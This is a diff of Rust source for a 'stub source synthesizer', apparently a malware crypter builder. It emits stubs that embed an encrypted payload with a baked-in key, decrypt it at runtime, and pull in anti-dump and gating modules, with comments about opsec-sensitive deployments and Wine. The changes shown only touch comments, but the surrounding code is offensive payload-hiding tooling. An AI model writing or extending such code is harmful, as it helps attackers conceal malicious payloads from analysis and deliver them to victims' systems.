@@ -1,8 +1,8 @@
 //! Per-build stub source synthesizer.
 //!
 //! Emits diagnostic eprintln traces throughout main() so runtime
-//! failures are visible on stderr. Remove the `[stub]` traces for
-//! opsec-sensitive deployments.
+//! failures under Wine (or any environment) are visible on stderr.
+//! Remove the `[stub]` traces for opsec-sensitive deployments.
 
 mod emit_antidump;
 mod emit_gates;
@@ -106,7 +106,7 @@ impl Synth {
         out.push_str(&rust_str_lit(&prog.profile));
         out.push_str(";\n\n");
 
-        // ─── payload sidecar ──────────────────────────────────────
+        // ─── payload (sidecar include) ────────────────────────────
         out.push_str("const PAYLOAD: &[u8] = include_bytes!(\"../payload.bin\");\n\n");
 
         // ─── baked payload key ────────────────────────────────────
@@ -293,6 +293,8 @@ impl Synth {
         match scheme {
             DecryptScheme::AesGcm | DecryptScheme::ChaCha20Poly1305
             | DecryptScheme::AesCbcHmac => {
+                // all AEAD schemes use the same wire format:
+                // nonce(12) || ct || tag(16)
                 s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                 s.push_str("    let key = PAYLOAD_KEY;\n");
                 s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
@@ -312,6 +314,7 @@ impl Synth {
 
         s.push_str("}\n\n");
 
+        // real AES-256-GCM
         s.push_str("fn aes_gcm_decrypt(key: &[u8; 32], nonce: &[u8], ct_and_tag: &[u8], out: &mut [u8]) -> Result<(), ()> {\n");
         s.push_str("    use aes_gcm::aead::{Aead, KeyInit};\n");
         s.push_str("    use aes_gcm::{Aes256Gcm, Nonce};\n");
